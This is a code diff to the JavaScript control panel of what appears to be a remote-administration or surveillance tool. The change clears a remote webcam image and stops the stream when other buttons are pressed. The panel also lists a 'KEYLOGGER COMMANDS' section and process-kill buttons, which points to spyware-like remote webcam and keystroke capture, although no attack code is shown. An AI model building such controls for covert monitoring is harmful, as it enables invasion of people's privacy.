@@ -81,7 +81,11 @@ function toggleWebcam() {
     switchView('view-media', 'Webcam Trực tiếp');
     
     if (!isWebcamOn) {
-        // Bật Webcam - DON'T update UI yet, wait for first frame
+        // Bật Webcam - Clear old image and DON'T update UI yet, wait for first frame
+        const webcamImg = document.getElementById('monitor-img');
+        if (webcamImg) {
+            webcamImg.src = ''; // Clear old screenshot image
+        }
         isWaitingForWebcamFrame = true;
         sendToGateway({ command: 'WEBCAM_START', frameRate: 10 });
         logStatus("Đang bật Webcam... Đợi nhận frame đầu tiên...");
@@ -90,6 +94,11 @@ function toggleWebcam() {
         isWebcamOn = false;
         isWaitingForWebcamFrame = false;
         updateWebcamButton();
+        // Clear the image when stopping webcam
+        const webcamImg = document.getElementById('monitor-img');
+        if (webcamImg) {
+            webcamImg.src = '';
+        }
         sendToGateway({ command: 'WEBCAM_STOP' });
         logStatus("Đã gửi lệnh tắt Webcam.");
     }
@@ -109,6 +118,57 @@ function updateWebcamButton() {
         btn.classList.remove('btn-warning');
         btn.classList.add('btn-info');
     }
+}
+
+// --- WEBCAM STATE MANAGER ---
+// Centralized webcam control - automatically turns off webcam when other buttons are pressed
+// This maintains separation of concerns by not modifying individual command functions
+
+/**
+ * Turns off webcam if it's currently on
+ * This is a pure function that only manages webcam state
+ */
+function turnOffWebcamIfOn() {
+    if (isWebcamOn || isWaitingForWebcamFrame) {
+        // Turn off webcam
+        isWebcamOn = false;
+        isWaitingForWebcamFrame = false;
+        updateWebcamButton();
+        // Clear the image when stopping webcam
+        const webcamImg = document.getElementById('monitor-img');
+        if (webcamImg) {
+            webcamImg.src = '';
+        }
+        sendToGateway({ command: 'WEBCAM_STOP' });
+    }
+}
+
+/**
+ * Initializes event delegation to automatically turn off webcam when other buttons are clicked
+ * This intercepts button clicks and turns off webcam before the original handler runs
+ * The webcam button itself is excluded from this behavior
+ * Handles both sidebar buttons and dynamically created buttons (e.g., kill buttons in table)
+ */
+function initWebcamAutoOff() {
+    const container = document.querySelector('.container');
+    if (!container) return;
+    
+    // Use event delegation to catch all button clicks in the container
+    // This includes sidebar buttons and dynamically created buttons in the table
+    container.addEventListener('click', function(event) {
+        // Find the clicked button (event might bubble from child elements)
+        const button = event.target.closest('button');
+        if (!button) return;
+        
+        // Exclude the webcam button itself
+        if (button.id === 'btn-webcam') return;
+        
+        // Turn off webcam if it's on (before the original onclick handler executes)
+        turnOffWebcamIfOn();
+        
+        // Note: The original onclick handler will still execute normally
+        // This just ensures webcam is turned off first
+    });
 }
 
 // --- KEYLOGGER COMMANDS ---
